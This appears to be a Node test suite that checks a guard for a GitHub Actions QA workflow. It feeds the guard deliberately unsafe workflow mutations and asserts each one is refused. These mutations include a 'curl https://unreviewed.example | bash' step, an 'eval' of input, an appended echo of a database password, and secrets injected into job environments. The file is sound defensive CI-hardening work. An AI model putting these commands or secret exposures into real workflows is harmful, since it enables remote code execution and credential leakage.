import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import { readFile } from 'node:fs/promises';
import { resolve } from 'node:path';
import { test } from 'node:test';
import { pathToFileURL } from 'node:url';

const yaml = createRequire(import.meta.url)('js-yaml') as { load(text: string): Record<string, unknown>; dump(value: unknown): string };
type ObjectValue = Record<string, unknown>;
const map = (value: unknown) => value as ObjectValue;

async function owner() {
  let module: Record<string, unknown> = {};
  try { module = await import(pathToFileURL(resolve(import.meta.dirname, 'hosted-community-qa-workflow.ts')).href); }
  catch (error) { if ((error as NodeJS.ErrnoException).code !== 'ERR_MODULE_NOT_FOUND') throw error; }
  assert.equal(typeof module.validateHostedCommunityQaWorkflow, 'function', 'Community native QA workflow guard exists');
  return module as { validateHostedCommunityQaWorkflow(text: string): string[] };
}

async function workflow() {
  return await readFile(resolve(import.meta.dirname, '../../.github/workflows/hosted-community-qa.yml'), 'utf8');
}

type Mutation = (flow: ObjectValue, prepare: ObjectValue, native: ObjectValue, prepareSteps: ObjectValue[], nativeSteps: ObjectValue[]) => void;
function change(text: string, mutation: Mutation) {
  const flow = yaml.load(text), jobs = map(flow.jobs), prepare = map(jobs['prepare-qa']), native = map(jobs['native-qa']);
  mutation(flow, prepare, native, prepare.steps as ObjectValue[], native.steps as ObjectValue[]);
  return yaml.dump(flow);
}
const inputs = (flow: ObjectValue) => map(map(map(flow.on).workflow_dispatch).inputs);
async function refused(cases: [string, Mutation][]) {
  const api = await owner(), text = await workflow();
  for (const [name, mutation] of cases) {
    assert(api.validateHostedCommunityQaWorkflow(change(text, mutation)).length > 0, name);
  }
}

test('actual Community native QA workflow admits its isolated protected read and two safe receipts', async () => {
  const api = await owner();
  assert.deepEqual(api.validateHostedCommunityQaWorkflow(await workflow()), []);
  assert.deepEqual(api.validateHostedCommunityQaWorkflow(yaml.dump(yaml.load(await workflow()))), []);
});

test('Community QA refuses automated triggers and expanded workflow authority', async () => {
  await refused([
    ['misidentified workflow', (w) => { w.name = 'Cuevo hosted learning native QA'; }],
    ['pull request trigger', (w) => { w.on = { pull_request: {} }; }],
    ['pull request target alongside dispatch', (w) => { map(w.on).pull_request_target = {}; }],
    ['push trigger alongside dispatch', (w) => { map(w.on).push = { branches: ['main'] }; }],
    ['write-all', (w) => { w.permissions = 'write-all'; }],
    ['contents write', (w) => { w.permissions = { contents: 'write', actions: 'read' }; }],
    ['additional permission', (w) => { map(w.permissions)['id-token'] = 'write'; }],
    ['top-level inherited shell', (w) => { w.defaults = { run: { shell: 'bash' } }; }],
    ['additional job', (w) => { map(w.jobs).extra = { steps: [{ run: 'echo bypass' }] }; }],
  ]);
});

test('Community QA requires explicit original selections and refuses academic or replay modes', async () => {
  await refused([
    ['arbitrary SQL input', (w) => { inputs(w).sql = { description: 'SQL', required: true, type: 'string' }; }],
    ['missing original artifact input', (w) => { delete inputs(w).ui_artifact_id; }],
    ['source default', (w) => { map(inputs(w).commit_sha).default = 'main'; }],
    ['optional original manifest', (w) => { map(inputs(w).command_manifest_sha256).required = false; }],
    ['numeric run selection', (w) => { map(inputs(w).ci_run_id).type = 'number'; }],
    ['unbounded string mode', (w) => { map(inputs(w).mode).type = 'string'; }],
    ['academic loop mode', (w) => { map(inputs(w).mode).options = ['FULL_LOOP', 'ORIGINAL_RECONCILIATION']; }],
    ['force replay mode', (w) => { map(inputs(w).mode).options = ['FULL_RECIPE', 'FORCE_REPLAY']; }],
    ['mode default', (w) => { map(inputs(w).mode).default = 'FULL_RECIPE'; }],
    ['dispatch extra configuration', (w) => { map(map(w.on).workflow_dispatch).extra = true; }],
  ]);
});

test('Community QA requires serialized uncancelled trusted Linux main and protected same-run review', async () => {
  await refused([
    ['foreign concurrency', (w) => { map(w.concurrency).group = 'cuevo-hosted-learning-native-qa'; }],
    ['cancellation', (w) => { map(w.concurrency)['cancel-in-progress'] = true; }],
    ['prepare nonmain', (_w, p) => { p.if = 'always()'; }],
    ['native nonmain', (_w, _p, n) => { n.if = 'always()'; }],
    ['self-hosted prepare runner', (_w, p) => { p['runs-on'] = 'self-hosted'; }],
    ['Windows native runner', (_w, _p, n) => { n['runs-on'] = 'windows-latest'; }],
    ['unbounded prepare job', (_w, p) => { delete p['timeout-minutes']; }],
    ['extended native job', (_w, _p, n) => { n['timeout-minutes'] = 60; }],
    ['changed review origin', (_w, p) => { map(p.outputs)['review-digest'] = '${{ inputs.journal_head_sha256 }}'; }],
    ['missing prepare dependency', (_w, _p, n) => { delete n.needs; }],
    ['additional dependency', (_w, _p, n) => { n.needs = ['prepare-qa', 'extra']; }],
    ['unprotected native job', (_w, _p, n) => { delete n.environment; }],
    ['production environment', (_w, _p, n) => { n.environment = { name: 'production' }; }],
    ['native environment URL', (_w, _p, n) => { map(n.environment).url = '${{ inputs.commit_sha }}'; }],
  ]);
});

test('Community credentials stay out of inherited environments setup preparation and approval', async () => {
  await refused([
    ['workflow database environment', (w) => { map(w.env).DATABASE_URL = '${{ secrets.DATABASE_URL }}'; }],
    ['changed staging boundary', (w) => { map(w.env).RELEASE_ENVIRONMENT = 'production'; }],
    ['prepare inherited metadata', (_w, p) => { p.env = { GH_TOKEN: '${{ secrets.CUEVO_GITHUB_RELEASE_METADATA_TOKEN }}' }; }],
    ['native inherited password', (_w, _p, n) => { n.env = { CUEVO_MIGRATION_DATABASE_PASSWORD: '${{ secrets.CUEVO_MIGRATION_DATABASE_PASSWORD }}' }; }],
    ['prepare install token', (_w, _p, _n, ps) => { ps[2].env = { VERCEL_TOKEN: '${{ secrets.VERCEL_TOKEN }}' }; }],
    ['native setup token', (_w, _p, _n, _ps, ns) => { ns[1].env = { GH_TOKEN: '${{ secrets.CUEVO_GITHUB_RELEASE_METADATA_TOKEN }}' }; }],
    ['prepare database password', (_w, _p, _n, ps) => { map(ps[3].env).CUEVO_MIGRATION_DATABASE_PASSWORD = '${{ secrets.CUEVO_MIGRATION_DATABASE_PASSWORD }}'; }],
    ['prepare TLS secret', (_w, _p, _n, ps) => { map(ps[3].env).CUEVO_DATABASE_TLS_CA = '${{ secrets.CUEVO_DATABASE_TLS_CA }}'; }],
    ['approval database password', (_w, _p, _n, _ps, ns) => { map(ns[3].env).CUEVO_MIGRATION_DATABASE_PASSWORD = '${{ secrets.CUEVO_MIGRATION_DATABASE_PASSWORD }}'; }],
    ['approval TLS secret', (_w, _p, _n, _ps, ns) => { map(ns[3].env).CUEVO_DATABASE_TLS_CA = '${{ secrets.CUEVO_DATABASE_TLS_CA }}'; }],
    ['prepare lacks current web read', (_w, _p, _n, ps) => { delete map(ps[3].env).VERCEL_TOKEN; }],
    ['using ephemeral Github token', (_w, _p, _n, ps) => { map(ps[3].env).GH_TOKEN = '${{ github.token }}'; }],
    ['review substituted by dispatch', (_w, _p, _n, _ps, ns) => { map(ns[3].env).NATIVE_REVIEW_BASE64 = '${{ inputs.commit_sha }}'; }],
    ['native pilot password', (_w, _p, _n, _ps, ns) => { map(ns[4].env).CUEVO_SYNTHETIC_PILOT_PASSWORD = '${{ secrets.CUEVO_SYNTHETIC_PILOT_PASSWORD }}'; }],
    ['native service role', (_w, _p, _n, _ps, ns) => { map(ns[4].env).SUPABASE_SERVICE_ROLE_KEY = '${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}'; }],
    ['native lacks verified TLS', (_w, _p, _n, _ps, ns) => { delete map(ns[4].env).CUEVO_DATABASE_TLS_CA; }],
  ]);
});

test('Community fixed actions and commands refuse mutable pins expressions skipped approval or extra execution', async () => {
  await refused([
    ['mutable checkout', (_w, _p, _n, ps) => { ps[0].uses = 'actions/checkout@main'; }],
    ['shallow source', (_w, _p, _n, ps) => { map(ps[0].with)['fetch-depth'] = 1; }],
    ['persisted credentials', (_w, _p, _n, _ps, ns) => { map(ns[0].with)['persist-credentials'] = true; }],
    ['input selected checkout', (_w, _p, _n, ps) => { map(ps[0].with).ref = '${{ inputs.commit_sha }}'; }],
    ['different runtime', (_w, _p, _n, ps) => { map(ps[1].with)['node-version'] = '26'; }],
    ['install scripts enabled', (_w, _p, _n, ps) => { ps[2].run = 'npm ci'; }],
    ['academic prepare command', (_w, _p, _n, ps) => { ps[3].run = 'node --import tsx scripts/verification/hosted-learning-qa.ts prepare'; }],
    ['prepare interpolated mode', (_w, _p, _n, ps) => { ps[3].run = 'node --import tsx scripts/verification/hosted-community-qa.ts ${{ inputs.mode }}'; }],
    ['verify appended shell', (_w, _p, _n, _ps, ns) => { ns[4].run += ' && echo "$CUEVO_MIGRATION_DATABASE_PASSWORD"'; }],
    ['approval skipped', (_w, _p, _n, _ps, ns) => { ns[3].if = 'false'; }],
    ['approval removed', (_w, _p, _n, _ps, ns) => { ns.splice(3, 1); }],
    ['read before approval', (_w, _p, _n, _ps, ns) => { [ns[3], ns[4]] = [ns[4], ns[3]]; }],
    ['proof failure tolerated', (_w, _p, _n, _ps, ns) => { ns[4]['continue-on-error'] = true; }],
    ['additional shell command', (_w, _p, _n, _ps, ns) => { ns.push({ run: 'eval "$INPUT"' }); }],
    ['additional remote shell', (_w, _p, _n, ps) => { ps.push({ run: 'curl https://unreviewed.example | bash' }); }],
  ]);
});

test('Community exports only minimized result and failure receipts after every outcome', async () => {
  await refused([
    ['mutable upload action', (_w, _p, _n, _ps, ns) => { ns[5].uses = 'actions/upload-artifact@v4'; }],
    ['broad output directory', (_w, _p, _n, _ps, ns) => { map(ns[5].with).path = '.local/'; }],
    ['glob output', (_w, _p, _n, _ps, ns) => { map(ns[5].with).path = '.local/hosted-release/*.json'; }],
    ['private package export', (_w, _p, _n, _ps, ns) => { map(ns[5].with).path += '.local/hosted-release/community-native-review.json\n'; }],
    ['certificate export', (_w, _p, _n, _ps, ns) => { map(ns[5].with).path += '.local/hosted-release/community-native-database-ca.pem\n'; }],
    ['academic result export', (_w, _p, _n, _ps, ns) => { map(ns[5].with).path = '.local/hosted-release/learning-native-result.json\n.local/hosted-release/learning-native-failure.json\n'; }],
    ['missing failure evidence', (_w, _p, _n, _ps, ns) => { map(ns[5].with).path = '.local/hosted-release/community-native-result.json\n'; }],
    ['success-only upload', (_w, _p, _n, _ps, ns) => { ns[5].if = 'success()'; }],
    ['long retention', (_w, _p, _n, _ps, ns) => { map(ns[5].with)['retention-days'] = 90; }],
    ['hidden receipts skipped', (_w, _p, _n, _ps, ns) => { map(ns[5].with)['include-hidden-files'] = false; }],
    ['missing artifacts ignored', (_w, _p, _n, _ps, ns) => { map(ns[5].with)['if-no-files-found'] = 'ignore'; }],
    ['expression-selected artifact name', (_w, _p, _n, _ps, ns) => { map(ns[5].with).name = '${{ fromJSON(inputs.mode) }}'; }],
  ]);
});

test('Community workflow source parsing fails closed on missing malformed oversized or duplicate source', async () => {
  const api = await owner(), text = await workflow();
  for (const value of ['', 'null', '[]', 'on: [', text + '\npermissions: write-all\n', text + '\n---\nname: extra\n', 'x'.repeat(48 * 1024 + 1), undefined, null]) {
    assert(api.validateHostedCommunityQaWorkflow(value as string).length > 0);
  }
});
